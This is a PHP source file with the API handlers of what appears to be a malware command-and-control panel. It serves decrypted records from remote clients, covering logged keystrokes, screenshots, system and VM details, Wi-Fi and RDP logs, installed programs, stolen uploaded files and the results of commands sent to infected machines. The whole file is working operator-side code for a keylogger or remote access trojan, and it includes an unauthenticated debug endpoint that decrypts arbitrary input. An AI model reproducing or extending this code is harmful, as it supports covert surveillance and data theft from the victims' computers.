<?php

function handleAPIRequests($pdo, $logged_in)
{
    // Import logging functions
    require_once __DIR__ . '/helpers.php';

    logInfo("API Request received", ['uri' => $_SERVER['REQUEST_URI'], 'method' => $_SERVER['REQUEST_METHOD']]);

    $apiEndpoints = [
        'get_logs',
        'get_user_data',
        'get_vm_status',
        'get_wifi_logs',
        'get_rdp_logs',
        'get_installed_programs',
        'get_uploaded_files',
        'download_log',
        'download_user_data'
    ];

    $isApiRequest = false;
    $requestedEndpoint = null;
    foreach ($apiEndpoints as $endpoint) {
        if (isset($_GET[$endpoint])) {
            $isApiRequest = true;
            $requestedEndpoint = $endpoint;
            break;
        }
    }

    if ($isApiRequest) {
        logInfo("API endpoint requested", ['endpoint' => $requestedEndpoint, 'logged_in' => $logged_in]);
    }

    if ($isApiRequest && !$logged_in) {
        logWarning("Unauthorized API access attempt", ['endpoint' => $requestedEndpoint]);
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(401);
        echo json_encode(['error' => 'Authentication required', 'redirect' => true]);
        exit;
    }

    if (!$logged_in) return;

    if (ob_get_level()) {
        ob_end_clean();
    }

    // UTF-8 cleaning functions
    function cleanUtf8($string)
    {
        if (!is_string($string)) return $string;
        if (function_exists('mb_convert_encoding')) {
            $string = mb_convert_encoding($string, 'UTF-8', 'UTF-8');
        }
        $string = preg_replace('/[^\x{0009}\x{000A}\x{000D}\x{0020}-\x{D7FF}\x{E000}-\x{FFFD}]+/u', '', $string);
        if (function_exists('iconv')) {
            $string = @iconv('UTF-8', 'UTF-8//IGNORE', $string);
        }
        return $string;
    }

    function cleanArray($array)
    {
        if (!is_array($array)) return cleanUtf8($array);
        foreach ($array as $key => $value) {
            $array[$key] = is_array($value) ? cleanArray($value) : (is_string($value) ? cleanUtf8($value) : $value);
        }
        return $array;
    }

    function sendJsonError($message)
    {
        logError("API Error", $message);
        $error_response = json_encode(['error' => cleanUtf8($message)], JSON_UNESCAPED_UNICODE);
        echo $error_response ?: '{"error": "Unknown error occurred"}';
        exit;
    }

    // Helper function to safely decrypt data
    function safeDecrypt($data, $key)
    {
        if (empty($data)) return '';

        $type = detectDataType($data);
        logDebug("SafeDecrypt", ['type' => $type, 'data_len' => strlen($data)]);

        switch ($type) {
            case 'encrypted':
                $result = decrypt($data, $key);
                logDebug("Decrypted result preview", substr($result, 0, 100));
                return cleanUtf8($result);
            case 'gzipped':
                $decoded = base64_decode($data);
                $decompressed = @gzdecode($decoded);
                return $decompressed !== false ? cleanUtf8($decompressed) : '[GZIP failed]';
            case 'base64':
                return cleanUtf8(base64_decode($data));
            case 'json':
            case 'plain':
            default:
                return cleanUtf8($data);
        }
    }

    // ===== GET LOGS =====
    if (isset($_GET['get_logs'])) {
        header('Content-Type: application/json; charset=utf-8');
        if (ob_get_length()) ob_clean();

        try {
            logInfo("Fetching logs from database");

            $stmt = $pdo->query("
                SELECT id, client_id, command, status, result, created_at, updated_at, completed_at
                FROM client_commands ORDER BY created_at DESC LIMIT 100
            ");
            $logs = $stmt->fetchAll();

            logInfo("Fetched logs", ['count' => count($logs)]);

            $processed_logs = [];
            foreach ($logs as $log) {
                $processed_log = [
                    'id' => $log['id'],
                    'client_id' => $log['client_id'],
                    'status' => $log['status'],
                    'created_at' => $log['created_at'],
                    'updated_at' => $log['updated_at'],
                    'completed_at' => $log['completed_at'],
                    'data_type' => detectDataType($log['command']),
                    'raw_result' => substr($log['result'] ?? '', 0, 200)
                ];

                // Decrypt command
                $processed_log['command'] = safeDecrypt($log['command'], Config::$ENCRYPTION_KEY);

                // Decrypt result
                $processed_log['result'] = $log['result']
                    ? safeDecrypt($log['result'], Config::$ENCRYPTION_KEY)
                    : '';

                $processed_logs[] = $processed_log;
            }

            $response = ['logs' => $processed_logs];
            $json = json_encode($response, JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);

            if ($json === false) {
                throw new Exception('JSON encoding failed: ' . json_last_error_msg());
            }

            logInfo("Returning logs response", ['json_length' => strlen($json)]);
            echo $json;
        } catch (Exception $e) {
            logError("get_logs failed", $e->getMessage());
            sendJsonError('Failed to fetch logs: ' . $e->getMessage());
        }
        exit;
    }

    // ===== GET USER DATA =====
    if (isset($_GET['get_user_data'])) {
        header('Content-Type: application/json; charset=utf-8');
        if (ob_get_length()) ob_clean();

        try {
            logInfo("Fetching user data");

            $stmt = $pdo->query("
                SELECT id, client_id, keystrokes, system_info, screenshot_path, created_at
                FROM user_data ORDER BY created_at DESC LIMIT 100
            ");
            $user_data = $stmt->fetchAll();

            logInfo("Fetched user data", ['count' => count($user_data)]);

            $processed_data = [];
            foreach ($user_data as $data) {
                $processed_item = [
                    'id' => $data['id'],
                    'client_id' => $data['client_id'],
                    'created_at' => $data['created_at'],
                    'raw_keystrokes' => $data['keystrokes'],
                    'raw_system_info' => $data['system_info']
                ];

                // Process keystrokes
                $processed_item['keystrokes'] = safeDecrypt($data['keystrokes'], Config::$ENCRYPTION_KEY);
                $processed_item['keystrokes'] = formatJsonForDownload($processed_item['keystrokes']);

                // Process system info
                $processed_item['system_info'] = safeDecrypt($data['system_info'], Config::$ENCRYPTION_KEY);
                $processed_item['system_info'] = formatJsonForDownload($processed_item['system_info']);

                // Process screenshot path
                if ($data['screenshot_path']) {
                    $base_path = realpath(__DIR__ . '/../') . '/';
                    $web_path = str_replace($base_path, '', $data['screenshot_path']);
                    if (strpos($web_path, '/') !== 0) $web_path = '/' . $web_path;
                    $processed_item['screenshot_url'] = cleanUtf8($web_path);
                } else {
                    $processed_item['screenshot_url'] = '';
                }

                $processed_data[] = $processed_item;
            }

            $response = ['user_data' => cleanArray($processed_data)];
            $json = json_encode($response, JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);

            if ($json === false) throw new Exception('JSON encoding failed: ' . json_last_error_msg());

            echo $json;
        } catch (Exception $e) {
            logError("get_user_data failed", $e->getMessage());
            sendJsonError('Failed to fetch user data: ' . $e->getMessage());
        }
        exit;
    }

    // ===== GET VM STATUS =====
    if (isset($_GET['get_vm_status'])) {
        header('Content-Type: application/json; charset=utf-8');
        if (ob_get_length()) ob_clean();

        try {
            $stmt = $pdo->query("
                SELECT client_id, vm_details, created_at
                FROM client_vm_status ORDER BY created_at DESC LIMIT 100
            ");
            $vm_status = $stmt->fetchAll();

            logInfo("Fetched VM status", ['count' => count($vm_status)]);

            $processed = [];
            foreach ($vm_status as $status) {
                $processed[] = [
                    'client_id' => $status['client_id'],
                    'created_at' => $status['created_at'],
                    'vm_details' => safeDecrypt($status['vm_details'], Config::$ENCRYPTION_KEY)
                ];
            }

            echo json_encode(['vm_status' => cleanArray($processed)], JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);
        } catch (Exception $e) {
            logError("get_vm_status failed", $e->getMessage());
            sendJsonError('Failed to fetch VM status: ' . $e->getMessage());
        }
        exit;
    }

    // ===== GET WIFI LOGS =====
    if (isset($_GET['get_wifi_logs'])) {
        header('Content-Type: application/json; charset=utf-8');
        if (ob_get_length()) ob_clean();

        try {
            $stmt = $pdo->query("
                SELECT id, client_id, message, created_at
                FROM client_logs WHERE log_type = 'wifi' ORDER BY created_at DESC LIMIT 100
            ");
            $wifi_logs = $stmt->fetchAll();

            logInfo("Fetched WiFi logs", ['count' => count($wifi_logs)]);

            $processed = [];
            foreach ($wifi_logs as $log) {
                $processed[] = [
                    'id' => $log['id'],
                    'client_id' => $log['client_id'],
                    'created_at' => $log['created_at'],
                    'message' => safeDecrypt($log['message'], Config::$ENCRYPTION_KEY)
                ];
            }

            echo json_encode(['wifi_logs' => cleanArray($processed)], JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);
        } catch (Exception $e) {
            logError("get_wifi_logs failed", $e->getMessage());
            sendJsonError('Failed to fetch Wi-Fi logs: ' . $e->getMessage());
        }
        exit;
    }

    // ===== GET RDP LOGS =====
    if (isset($_GET['get_rdp_logs'])) {
        header('Content-Type: application/json; charset=utf-8');
        if (ob_get_length()) ob_clean();

        try {
            $stmt = $pdo->query("
                SELECT id, client_id, message, created_at
                FROM client_logs WHERE log_type = 'rdp' ORDER BY created_at DESC LIMIT 100
            ");
            $rdp_logs = $stmt->fetchAll();

            logInfo("Fetched RDP logs", ['count' => count($rdp_logs)]);

            $processed = [];
            foreach ($rdp_logs as $log) {
                $processed[] = [
                    'id' => $log['id'],
                    'client_id' => $log['client_id'],
                    'created_at' => $log['created_at'],
                    'message' => safeDecrypt($log['message'], Config::$ENCRYPTION_KEY)
                ];
            }

            echo json_encode(['rdp_logs' => cleanArray($processed)], JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);
        } catch (Exception $e) {
            logError("get_rdp_logs failed", $e->getMessage());
            sendJsonError('Failed to fetch RDP logs: ' . $e->getMessage());
        }
        exit;
    }

    // ===== GET INSTALLED PROGRAMS =====
    if (isset($_GET['get_installed_programs'])) {
        header('Content-Type: application/json; charset=utf-8');
        if (ob_get_length()) ob_clean();

        try {
            $stmt = $pdo->query("
                SELECT id, client_id, program_data, created_at
                FROM client_installed_programs ORDER BY created_at DESC LIMIT 100
            ");
            $programs = $stmt->fetchAll();

            logInfo("Fetched installed programs", ['count' => count($programs)]);

            $processed = [];
            foreach ($programs as $program) {
                $processed[] = [
                    'id' => $program['id'],
                    'client_id' => $program['client_id'],
                    'created_at' => $program['created_at'],
                    'program_data' => safeDecrypt($program['program_data'], Config::$ENCRYPTION_KEY)
                ];
            }

            echo json_encode(['installed_programs' => cleanArray($processed)], JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);
        } catch (Exception $e) {
            logError("get_installed_programs failed", $e->getMessage());
            sendJsonError('Failed to fetch installed programs: ' . $e->getMessage());
        }
        exit;
    }

    // ===== GET UPLOADED FILES =====
    if (isset($_GET['get_uploaded_files'])) {
        header('Content-Type: application/json; charset=utf-8');
        if (ob_get_length()) ob_clean();

        try {
            $stmt = $pdo->query("
                SELECT id, client_id, filename, file_path AS message, created_at
                FROM client_files ORDER BY created_at DESC LIMIT 100
            ");
            $file_logs = $stmt->fetchAll();

            logInfo("Fetched uploaded files", ['count' => count($file_logs)]);

            $processed = [];
            foreach ($file_logs as $log) {
                $filePath = safeDecrypt($log['message'], Config::$ENCRYPTION_KEY);

                $processed[] = [
                    'id' => $log['id'],
                    'client_id' => $log['client_id'],
                    'filename' => $log['filename'],
                    'created_at' => $log['created_at'],
                    'message' => $filePath,
                    'file_data' => [
                        'filename' => $log['filename'],
                        'file_path' => $filePath
                    ],
                    'file_url' => $filePath ? ('/' . ltrim(str_replace(__DIR__ . '/../', '', $filePath), '/')) : ''
                ];
            }

            echo json_encode(['file_logs' => cleanArray($processed)], JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);
        } catch (Exception $e) {
            logError("get_uploaded_files failed", $e->getMessage());
            sendJsonError('Failed to fetch uploaded files: ' . $e->getMessage());
        }
        exit;
    }

    // ===== DOWNLOAD LOG =====
    if (isset($_GET['download_log']) && isset($_GET['log_id'])) {
        try {
            $log_id = filter_var($_GET['log_id'], FILTER_VALIDATE_INT);
            if ($log_id === false) die("Invalid log ID");

            $stmt = $pdo->prepare("
                SELECT client_id, command, status, result, created_at, completed_at
                FROM client_commands WHERE id = ?
            ");
            $stmt->execute([$log_id]);
            $log = $stmt->fetch();

            if (!$log) die("Log not found");

            logInfo("Downloading log", ['log_id' => $log_id]);

            $command = safeDecrypt($log['command'], Config::$ENCRYPTION_KEY);
            $result = $log['result'] ? safeDecrypt($log['result'], Config::$ENCRYPTION_KEY) : 'No result';

            $content = "Client ID: {$log['client_id']}\n";
            $content .= "Command: {$command}\n";
            $content .= "Status: {$log['status']}\n";
            $content .= "Result:\n" . formatJsonForDownload($result) . "\n";
            $content .= "Created At: {$log['created_at']}\n";
            $content .= "Completed At: " . ($log['completed_at'] ?: 'N/A') . "\n";

            header('Content-Type: text/plain; charset=utf-8');
            header('Content-Disposition: attachment; filename="log_' . $log_id . '.txt"');
            header('Content-Length: ' . strlen($content));
            echo $content;
        } catch (Exception $e) {
            logError("download_log failed", $e->getMessage());
            die("Failed to download log");
        }
        exit;
    }

    // ===== DOWNLOAD USER DATA =====
    if (isset($_GET['download_user_data']) && isset($_GET['data_id'])) {
        try {
            $data_id = filter_var($_GET['data_id'], FILTER_VALIDATE_INT);
            if ($data_id === false) die("Invalid data ID");

            $stmt = $pdo->prepare("
                SELECT client_id, keystrokes, system_info, screenshot_path, created_at
                FROM user_data WHERE id = ?
            ");
            $stmt->execute([$data_id]);
            $data = $stmt->fetch();

            if (!$data) die("Data not found");

            logInfo("Downloading user data", ['data_id' => $data_id]);

            $keystrokes = safeDecrypt($data['keystrokes'], Config::$ENCRYPTION_KEY);
            $system_info = safeDecrypt($data['system_info'], Config::$ENCRYPTION_KEY);

            $content = "Client ID: {$data['client_id']}\n";
            $content .= "Keystrokes:\n" . ($keystrokes ? formatJsonForDownload($keystrokes) : 'No keystrokes') . "\n";
            $content .= "System Info:\n" . ($system_info ? formatJsonForDownload($system_info) : 'No system info') . "\n";
            $content .= "Screenshot: " . ($data['screenshot_path'] ?: 'No screenshot') . "\n";
            $content .= "Created At: {$data['created_at']}\n";

            header('Content-Type: text/plain; charset=utf-8');
            header('Content-Disposition: attachment; filename="user_data_' . $data_id . '.txt"');
            header('Content-Length: ' . strlen($content));
            echo $content;
        } catch (Exception $e) {
            logError("download_user_data failed", $e->getMessage());
            die("Failed to download user data");
        }
        exit;
    }

    // ===== DEBUG ENDPOINT (optional - remove in production) =====
    if (isset($_GET['debug_encryption'])) {
        header('Content-Type: application/json; charset=utf-8');

        $debug_info = [
            'encryption_key_set' => !empty(Config::$ENCRYPTION_KEY),
            'encryption_key_length' => strlen(Config::$ENCRYPTION_KEY ?? ''),
            'openssl_available' => extension_loaded('openssl'),
            'available_ciphers' => openssl_get_cipher_methods()
        ];

        // Test with sample encrypted data if provided
        if (isset($_GET['test_data'])) {
            $test_data = $_GET['test_data'];
            $debug_info['test_input'] = substr($test_data, 0, 100);
            $debug_info['detected_type'] = detectDataType($test_data);
            $debug_info['decrypt_result'] = substr(decrypt($test_data, Config::$ENCRYPTION_KEY), 0, 200);
        }

        logInfo("Debug encryption endpoint accessed", $debug_info);
        echo json_encode($debug_info, JSON_PRETTY_PRINT);
        exit;
    }
}
